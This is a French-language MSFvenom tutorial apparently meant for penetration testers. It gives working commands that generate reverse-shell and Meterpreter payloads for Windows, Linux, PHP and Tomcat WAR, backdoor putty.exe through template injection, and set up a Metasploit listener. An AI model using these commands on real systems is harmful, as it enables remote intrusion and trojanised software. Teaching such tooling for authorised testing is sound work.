# Guide Pratique MSFvenom : Génération et Encodage de Payloads

Ce guide présente les fondamentaux de **MSFvenom**, le générateur autonome de charges utiles (*payloads*) intégré au framework Metasploit.

---

## 1. Introduction à MSFvenom

Au sein de l'écosystème Metasploit, **MSFvenom** est né de la fusion de deux anciens utilitaires :
* **`msfpayload`** : servait à configurer et générer les binaires de charge utile.
* **`msfencode`** : servait à obfusquer et éliminer les *bad characters* (octets nuls, retours chariots, etc.).

L'objectif de MSFvenom est de créer des exécutables, des scripts ou du code brut (*shellcode*) qui, une fois exécutés sur un système distant, établissent une communication avec la machine de l'auditeur (shell standard, session Meterpreter, etc.).

---

## 2. Concepts Clés

| Concept | Description |
| :--- | :--- |
| **Payload** | Le code exécutable déployé sur la machine cible (ex. : shell interactif, Meterpreter). |
| **Reverse Shell** | La cible initie la connexion sortante vers l'attaquant. C'est l'approche la plus courante car elle traverse généralement les règles de pare-feu et les passerelles NAT. |
| **Bind Shell** | La cible ouvre un port d'écoute local et attend une connexion entrante provenant de l'attaquant. |
| **Encodage** | Transformation du payload (ex. via `shikata_ga_nai`) pour supprimer les caractères interdits et modifier l'empreinte statique du binaire. *(Note : l'encodage seul ne suffit plus face aux antivirus modernes).* |
| **Template / Injection** | Intégration du payload dans un binaire légitime existant (ex. un installateur logiciel) pour dissimuler son exécution. |

---

## 3. Syntaxe Générale

La structure de base d'une commande MSFvenom s'organise ainsi :

```bash
msfvenom -p <PAYLOAD> [OPTIONS] LHOST=<IP_ATTAQUANT> LPORT=<PORT_ECOUTE> -f <FORMAT> -o <FICHIER_SORTIE>
```

> **Astuce :** L'option `-o nom_fichier` est recommandée à la place de la redirection standard `> nom_fichier` pour éviter d'éventuelles corruptions de binaires sous certains shells.

---

## 4. Options Principales

| Option | Rôle | Exemple |
| :--- | :--- | :--- |
| **`-p`** | Sélectionne le payload | `-p windows/x64/meterpreter/reverse_tcp` |
| **`LHOST`** | IP ou nom d'hôte de la machine d'écoute (*listener*) | `LHOST=192.168.1.10` |
| **`LPORT`** | Port d'écoute configuré sur la machine d'attaque | `LPORT=4444` |
| **`-f`** | Format de sortie du fichier | `-f exe`, `-f elf`, `-f raw`, `-f py` |
| **`-o`** | Nom et chemin du fichier de sortie | `-o payload.exe` |
| **`-a`** | Architecture cible du processeur | `-a x86`, `-a x64` |
| **`--platform`** | Système d'exploitation cible | `--platform windows`, `--platform linux` |
| **`-e`** | Encodeur à appliquer | `-e x86/shikata_ga_nai` |
| **`-i`** | Nombre d'itérations de l'encodeur | `-i 3` |
| **`-b`** | Caractères interdits à exclure du shellcode (*bad characters*) | `-b "\x00\x0a\x0d"` |
| **`-x`** | Binaire légitime utilisé comme modèle (*template*) | `-x putty.exe` |
| **`-k`** | Préserve l'exécution normale du template (*keep*) | `-k` |

---

## 5. Exemples Pratiques par Plateforme

### Windows (.exe)
```bash
# Reverse TCP Meterpreter (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o agent.exe
```

### Linux (.elf)
```bash
# Reverse TCP Shell standard (64-bit)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o binary.elf
```

### Web (PHP & JSP)
```bash
# Fichier PHP pour intrusion web
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# Fichier WAR pour serveurs Tomcat / Java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war -o shell.war
```

### Injection dans un exécutable légitime (Template)
```bash
# Injecte un payload dans putty.exe tout en préservant son comportement (-k)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe
```

---

## 6. Réception de la Connexion (`multi/handler`)

Tout payload de type reverse shell nécessite la configuration d'un écouteur sur Metasploit pour intercepter le signal entrant :

```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```